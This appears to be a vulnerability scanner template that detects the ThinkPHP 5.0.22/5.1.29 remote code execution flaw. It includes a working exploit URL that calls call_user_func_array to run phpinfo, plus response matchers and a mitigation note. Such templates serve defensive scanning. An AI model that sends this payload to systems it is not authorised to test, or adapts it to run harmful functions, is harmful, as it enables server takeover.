id: thinkphp-5022-rce
info:
  name: ThinkPHP - Remote Code Execution
  author: dr_set
  severity: critical
  description: The vulnerability in ThinkPHP versions 5.0.22 and 5.1.29 can result
    in a remote attacker gaining complete control over a system without providing
    mandatory credentials.
  reference: https://github.com/vulhub/vulhub/tree/0a0bc719f9a9ad5b27854e92bc4dfa17deea25b4/thinkphp/5-rce
  tags: thinkphp,rce
  metadata:
    impact: The ThinkPHP-5022-rce vulnerability can result in serious consequences
      such as data theft, system compromise, and unauthorized access to sensitive
      information.
    recommendation: Ensure that mandatory routing is enabled on any website running
      ThinkPHP 5.0.22 or 5.1.29 to prevent remote code execution vulnerabilities.
requests:
- method: GET
  path:
  - '{{BaseURL}}?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1'
  matchers-condition: and
  matchers:
  - type: word
    words:
    - PHP Extension
    - PHP Version
    - ThinkPHP
    condition: and
  - type: status
    status:
    - 200
